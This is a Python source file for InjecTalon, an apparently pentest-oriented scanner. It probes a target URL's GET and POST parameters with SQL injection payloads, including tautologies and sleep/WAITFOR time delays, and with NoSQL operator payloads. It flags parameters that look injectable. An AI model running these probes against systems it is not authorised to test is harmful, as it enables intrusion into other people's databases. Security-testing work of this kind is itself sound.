#!/usr/bin/env python3
"""
InjecTalon v1.0
Author: Hammad Munir | 6amsolution Private Limited

A modular, automated SQL Injection reconnaissance tool
"""

import requests
import time
import urllib.parse
import argparse

# Common payloads for detection
SQLI_TESTS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
    "admin'--", "' OR sleep(5)--", "'; WAITFOR DELAY '0:0:5'--"
]

TIME_BASED_PAYLOADS = [
    "' OR sleep(5)--",
    "\" OR sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
]

NOSQLI_TESTS = [
    '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}'
]

HEADERS = {
    'User-Agent': 'InjecTalon/1.0 - 6amsolution'
}

def test_sqli_get(url):
    print("[*] Starting GET parameter SQLi tests...")
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        print("[!] No GET parameters found in URL.")
        return []

    vulnerable_params = []

    for param in params:
        original_value = params[param][0]
        for payload in SQLI_TESTS:
            test_params = params.copy()
            test_params[param] = [original_value + payload]
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))

            try:
                resp = requests.get(test_url, headers=HEADERS, timeout=10)
                body = resp.text.lower()
                # Basic error signature checks
                error_signatures = ["syntax error", "mysql", "sql", "database error", "unterminated string literal"]
                if any(e in body for e in error_signatures):
                    print(f"[+] Potential SQLi found on param '{param}' with payload '{payload}'")
                    vulnerable_params.append(param)
                    break
            except Exception as e:
                print(f"[!] Error testing {test_url}: {e}")
    return vulnerable_params

def test_sqli_post(url, data):
    print("[*] Starting POST parameter SQLi tests...")
    vulnerable_params = []
    for param in data:
        original_value = data[param]
        for payload in SQLI_TESTS:
            test_data = data.copy()
            test_data[param] = original_value + payload
            try:
                resp = requests.post(url, data=test_data, headers=HEADERS, timeout=10)
                body = resp.text.lower()
                error_signatures = ["syntax error", "mysql", "sql", "database error", "unterminated string literal"]
                if any(e in body for e in error_signatures):
                    print(f"[+] Potential SQLi found on POST param '{param}' with payload '{payload}'")
                    vulnerable_params.append(param)
                    break
            except Exception as e:
                print(f"[!] Error testing POST param {param}: {e}")
    return vulnerable_params

def test_blind_sqli_time(url, param):
    print(f"[*] Starting time-based blind SQLi tests on parameter '{param}'...")
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    original_value = params[param][0]

    for payload in TIME_BASED_PAYLOADS:
        test_params = params.copy()
        test_params[param] = [original_value + payload]
        test_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = urllib.parse.urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
        try:
            start = time.time()
            resp = requests.get(test_url, headers=HEADERS, timeout=15)
            duration = time.time() - start
            if duration > 4:
                print(f"[!!!] Time-based SQLi likely on param '{param}' with payload '{payload}' (Response delay: {duration:.2f}s)")
                return True
        except Exception as e:
            print(f"[!] Error testing time-based payload on {test_url}: {e}")
    print(f"[*] No time-based blind SQLi detected on parameter '{param}'.")
    return False

def test_nosqli(url):
    print("[*] Testing for NoSQL injection payload reflections...")
    vulnerable = False
    for payload in NOSQLI_TESTS:
        try:
            resp = requests.get(url, headers=HEADERS, timeout=10, params={"search": payload})
            if payload in resp.text:
                print(f"[+] Potential NoSQL injection point detected with payload: {payload}")
                vulnerable = True
        except Exception as e:
            print(f"[!] Error testing NoSQL payload {payload}: {e}")
    if not vulnerable:
        print("[*] No obvious NoSQL injection detected.")
    return vulnerable

def parse_post_data(data_str):
    data = {}
    for pair in data_str.split('&'):
        if '=' in pair:
            key, value = pair.split('=', 1)
            data[key] = value
        else:
            print(f"[!] Ignoring invalid POST data part: {pair}")
    return data

def main():
    parser = argparse.ArgumentParser(description="InjecTalon v1.0 - Automated SQL Injection reconnaissance tool")
    parser.add_argument("-u", "--url", help="Target URL (GET parameters supported)", required=True)
    parser.add_argument("-X", "--method", help="HTTP Method (GET or POST)", choices=["GET", "POST"], default="GET")
    parser.add_argument("-d", "--data", help="POST data (key=value&key2=value2)", default=None)
    parser.add_argument("-b", "--blind", help="Run blind time-based SQLi tests on GET params", action="store_true")
    parser.add_argument("-n", "--nosqli", help="Test for NoSQL injection vulnerabilities", action="store_true")
    args = parser.parse_args()

    if args.method == "POST" and not args.data:
        print("[!] POST method requires --data argument")
        return

    print(f"[*] Starting scan on: {args.url} using method: {args.method}")

    vulnerable = []

    if args.method == "GET":
        vulnerable = test_sqli_get(args.url)
        if args.blind and vulnerable:
            print("[*] Running time-based blind SQLi tests on detected vulnerable GET params...")
            for param in vulnerable:
                test_blind_sqli_time(args.url, param)
    else:
        post_data = parse_post_data(args.data)
        vulnerable = test_sqli_post(args.url, post_data)

    if args.nosqli:
        test_nosqli(args.url)

    if not vulnerable:
        print("[*] No vulnerable parameters detected during basic tests.")
    else:
        print("[*] Vulnerable parameters found:")
        for p in vulnerable:
            print(f" - {p}")

if __name__ == "__main__":
    main()
